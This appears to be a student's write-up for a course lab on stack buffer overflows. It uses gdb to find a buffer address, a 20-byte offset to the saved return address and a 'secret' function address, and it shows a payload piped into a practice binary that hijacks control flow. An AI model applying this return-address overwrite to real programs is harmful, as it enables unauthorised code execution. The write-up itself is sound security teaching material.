# Buffer Starting Address
The buffer address is calculated and stored into %eax at:

0x080497f5 <+21>: lea -0x10(%ebp), %eax

From which, we find the buffer address as: 0xffffd198

# Buffer Offset from Frame Pointer
The buffer is located at: ebp - 0x10
The return address is located at: ebp +
Therefore, the total offset from the start of the buffer to the return address is: (ebp + 4) - (ebp - 0x10) = 0x14 = 20 bytes


Buffer offset from frame pointer = 16 bytes
Buffer offset from return address = 20 bytes

# Return Address of the Secret Function

Secret function return address is: 0x080497b5

found by the following command and output:

(gdb) p &secret
$1 = (void (*)()) 0x080497b5 <secret>

#First assembly instruction of secret function

0x080497b5 <+0>:     push   %ebp

# Output

(.venv) ubuntu@netsec-vm:~/PA3/release/practice$ python3 exp-practice.py | ./vuln
> AAAAAAAAAAAAAAAAaaaa��
>> you have found the secret function
Segmentation fault (core dumped)


screenshot also included in the submission folder
